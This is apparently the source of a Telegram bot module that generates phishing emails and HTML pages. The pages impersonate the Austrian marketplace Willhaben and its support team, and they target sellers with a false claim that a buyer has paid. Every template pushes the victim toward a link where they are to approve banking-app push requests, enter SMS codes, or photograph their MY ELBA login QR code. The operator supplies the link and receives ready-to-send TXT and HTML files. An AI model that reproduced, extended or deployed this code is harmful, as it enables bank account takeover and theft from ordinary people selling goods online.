from __future__ import annotations

import re
import time
from typing import Callable, Dict, Tuple, Optional

from aiogram import F, Router, types
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

router = Router(name="html_templates")

# ---------- FSM ----------
class HtmlMenuFSM(StatesGroup):
    wait_link = State()
    wait_text = State()  # только для CUSTOM

# ---------- UI ----------
def html_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📄 GO",   callback_data="htmlmenu:pick:GO"),
         InlineKeyboardButton(text="🖼 QR",   callback_data="htmlmenu:pick:QR")],
        [InlineKeyboardButton(text="📲 PUSH", callback_data="htmlmenu:pick:PUSH"),
         InlineKeyboardButton(text="💬 SMS",  callback_data="htmlmenu:pick:SMS")],
        [InlineKeyboardButton(text="🔄 BACK", callback_data="htmlmenu:pick:BACK"),
         InlineKeyboardButton(text="📝 CUSTOM", callback_data="htmlmenu:pick:CUSTOM")],
        [InlineKeyboardButton(text="🚫 Отмена", callback_data="htmlmenu:cancel")],
    ])

def html_cancel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Отмена", callback_data="htmlmenu:cancel")]
    ])

# ---------- Заголовки вкладки браузера для каждого шаблона ----------
TPL_PAGE_TITLES: Dict[str, str] = {
    "GO":   "Transaktion erfolgreich!",
    "QR":   "QR-Bestätigung",
    "PUSH": "Push-Bestätigung",
    "SMS":  "SMS-Bestätigung",
    "BACK": "Zur Website zurück",
    "CUSTOM": "Benachrichtigung",
}

# ---------- Хранилище последнего HTML по чату ----------
_LAST_HTML_PER_CHAT: Dict[int, str] = {}

def set_last_html(chat_id: int, html: str) -> None:
    _LAST_HTML_PER_CHAT[chat_id] = html or ""

def get_last_html(chat_id: int) -> Optional[str]:
    return _LAST_HTML_PER_CHAT.get(chat_id)

# ---------- Билдеры ----------
def _base_card_html(page_title: str, header_title: str, paragraph: str, link: str, button_text: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="de"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{page_title}</title>
<style>
body{{font-family:Arial,sans-serif;background-color:#f4f4f4;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.card{{background:#fff;padding:20px;border-radius:10px;box-shadow:0 4px 8px rgba(0,0,0,.2);text-align:center;max-width:380px}}
.card img{{width:150px;margin-bottom:15px}}
.card h2{{color:#333}}
.card p{{color:#666;font-size:18px}}
.blue-box{{background-color:#65d1fe;padding:20px;border-radius:10px;margin-top:15px}}
.button{{display:inline-block;padding:12px 20px;background-color:#08a4ec;color:#fff;text-decoration:none;border-radius:5px;font-size:16px;font-weight:bold;transition:background .3s,color .3s;border:none;cursor:pointer}}
.button:hover{{background-color:#08a4ec;color:#AFEEEE}}
</style></head>
<body><div class="card">
<img src="https://ik.imagekit.io/9qnmsf205l/image_w.jpg?updatedAt=1751141682362" alt="Logo">
<h2>{header_title}</h2>
<p>{paragraph}</p>
<div class="blue-box"><a href="{link}" class="button">{button_text}</a></div>
</div></body></html>"""

def build_go(link: str) -> Tuple[str, str]:
    page_title = TPL_PAGE_TITLES.get("GO", "Transaktion erfolgreich!")
    header_title = "Sehr geehrter Kunde, der Käufer hat Ihre Ware bei Willhaben bezahlt!"
    paragraph = "Um die Zahlung zu erhalten, klicken Sie auf die blaue Schaltfläche am Ende der E-Mail und folgen Sie den weiteren Anweisungen auf der Website. Vielen Dank für Ihr Vertrauen in Willhaben!"
    txt = f"{header_title}\n\n{paragraph}\n\nLINK: {link}\n"
    html = _base_card_html(page_title, header_title, paragraph, link, "ERHALT DER ZAHLUNG")
    return txt, html

def build_push(link: str) -> Tuple[str, str]:
    page_title = TPL_PAGE_TITLES.get("PUSH", "Push-Bestätigung")
    header_title = "Wichtige Nachricht!"
    paragraph = "Lieber Kunde, Sie müssen die PUSH-Benachrichtigung in der Banking-App bestätigen, um das Geld zu erhalten. Dies ist eine Anforderung Ihrer Bank, um Ihr Konto zu verifizieren. Danach wird das Geld auf Ihrem Konto gutgeschrieben."
    txt = f"{header_title}\n\n{paragraph}\n\nLINK: {link}\n"
    html = _base_card_html(page_title, header_title, paragraph, link, "ERHALT DER ZAHLUNG")
    return txt, html

def build_qr(link: str) -> Tuple[str, str]:
    page_title = TPL_PAGE_TITLES.get("QR", "QR-Bestätigung")
    header_title = "Wichtige Nachricht!"
    paragraph = ('Ihr Konto wurde erfolgreich verifiziert. Bevor die Zahlung auf Ihr Konto gutgeschrieben wird, '
                 'müssen Sie noch einen Schritt ausführen. Bitte gehen Sie zu MY ELBA, wählen Sie die Option "QR-Code anfordern", '
                 'fotografieren Sie dann Ihr Mobiltelefon mit dem angezeigten QR-Code und senden Sie dieses Bild im Support-Chat. '
                 'Sie können auch ein Foto in einer Antwort auf diese E-Mail anhängen. Wir werden Ihnen ein Beispiel dafür geben, '
                 'was genau gesendet werden muss (bitte beachten Sie, dass es sich nicht um einen Screenshot handeln darf) im Support-Fenster '
                 'auf dieser Website, das sich in der unteren rechten Ecke der Seite befindet (blauer Kreis).')
    txt = f"{header_title}\n\n{paragraph}\n\nLINK: {link}\n"
    html = _base_card_html(page_title, header_title, paragraph, link, "ERHALT DER ZAHLUNG")
    return txt, html

def build_sms(link: str) -> Tuple[str, str]:
    page_title = TPL_PAGE_TITLES.get("SMS", "SMS-Bestätigung")
    header_title = "Wichtige Nachricht!"
    paragraph = "Sehr geehrter Kunde, um Geld zu erhalten, müssen Sie auf der Website einen SMS-Code eingeben. Dies ist eine Aufforderung Ihrer Bank, Ihr Konto zu verifizieren. Danach wird das Geld auf Ihrem Konto gutgeschrieben."
    txt = f"{header_title}\n\n{paragraph}\n\nLINK: {link}\n"
    html = _base_card_html(page_title, header_title, paragraph, link, "ERHALT DER ZAHLUNG")  # латинская T
    return txt, html

def build_back(link: str) -> Tuple[str, str]:
    page_title = TPL_PAGE_TITLES.get("BACK", "Zur Website zurück")
    header_title = "Wichtige Nachricht!"
    paragraph = "Sehr geehrter Käufer, Sie haben die Verifizierung Ihres Kontos noch nicht abgeschlossen, so dass das Geld noch nicht gutgeschrieben wurde. Bitte gehen Sie zurück auf die Website und folgen Sie den Anweisungen."
    txt = f"{header_title}\n\n{paragraph}\n\nLINK: {link}\n"
    html = _base_card_html(page_title, header_title, paragraph, link, "WEBSITE")
    return txt, html

def build_custom(link: str, text: str) -> Tuple[str, str]:
    page_title = TPL_PAGE_TITLES.get("CUSTOM", "Benachrichtigung")
    header_title = "Nachricht vom technischen Support von Willhaben!"
    paragraph = text
    txt = f"{header_title}\n\n{paragraph}\n\nLINK: {link}\n"
    html = _base_card_html(page_title, header_title, paragraph, link, "ZAHLUNG ERHALTEN")
    return txt, html

BUILDERS: Dict[str, Callable[[str], Tuple[str, str]]] = {
    "GO": build_go,
    "PUSH": build_push,
    "QR": build_qr,
    "SMS": build_sms,
    "BACK": build_back,
}

# ---------- Вспомогательные ----------
def _valid_link(url: str) -> bool:
    return bool(re.match(r"^https?://", (url or "").strip(), flags=re.IGNORECASE))

def _file_pair(txt: str, html: str, base: str) -> tuple[types.BufferedInputFile, types.BufferedInputFile]:
    # Имена только из цифр + 's'
    ts = int(time.time())
    name_html = f"{ts}s.html"
    name_txt = f"{ts}s.txt"
    return (
        types.BufferedInputFile((txt or "").encode("utf-8"), filename=name_txt),
        types.BufferedInputFile((html or "").encode("utf-8"), filename=name_html),
    )

# ---------- Handlers ----------
@router.message(F.text == "🧾 HTML-шаблоны")
async def open_menu(m: types.Message, state: FSMContext):
    await state.clear()
    await m.answer("Выберите шаблон:", reply_markup=html_menu_kb())

@router.callback_query(F.data.startswith("htmlmenu:pick:"))
async def pick_tpl(c: types.CallbackQuery, state: FSMContext):
    tpl = c.data.split(":")[2]
    await state.update_data(tpl=tpl)
    await c.message.answer("Введите ссылку 🔗", reply_markup=html_cancel_kb())
    await state.set_state(HtmlMenuFSM.wait_link)
    await c.answer()

@router.callback_query(F.data == "htmlmenu:cancel")
async def cancel_menu(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await c.message.edit_text("Отменено.")
    await c.answer()

@router.message(HtmlMenuFSM.wait_link)
async def got_link(m: types.Message, state: FSMContext):
    link = (m.text or "").strip()
    if not _valid_link(link):
        await m.answer("Некорректная ссылка. Нужен http(s) URL.", reply_markup=html_cancel_kb())
        return
    data = await state.get_data()
    tpl = data.get("tpl", "")
    await state.update_data(link=link)

    if tpl == "CUSTOM":
        await m.answer("Введите текст для шаблона ✍️", reply_markup=html_cancel_kb())
        await state.set_state(HtmlMenuFSM.wait_text)
        return

    builder = BUILDERS.get(tpl)
    if not builder:
        await m.answer("Шаблон не найден.")
        await state.clear(); return

    txt, html = builder(link)
    set_last_html(m.chat.id, html)

    txtf, htmlf = _file_pair(txt, html, tpl.lower())
    await m.answer_document(txtf, caption=f"{tpl} (TXT)")
    await m.answer_document(htmlf, caption=f"{tpl} (HTML)")
    await state.clear()

@router.message(HtmlMenuFSM.wait_text)
async def got_custom_text(m: types.Message, state: FSMContext):
    data = await state.get_data()
    link = data.get("link", "")
    txt, html = build_custom(link, (m.text or "").strip())
    set_last_html(m.chat.id, html)

    txtf, htmlf = _file_pair(txt, html, "custom")
    await m.answer_document(txtf, caption="CUSTOM (TXT)")
    await m.answer_document(htmlf, caption="CUSTOM (HTML)")
    await state.clear()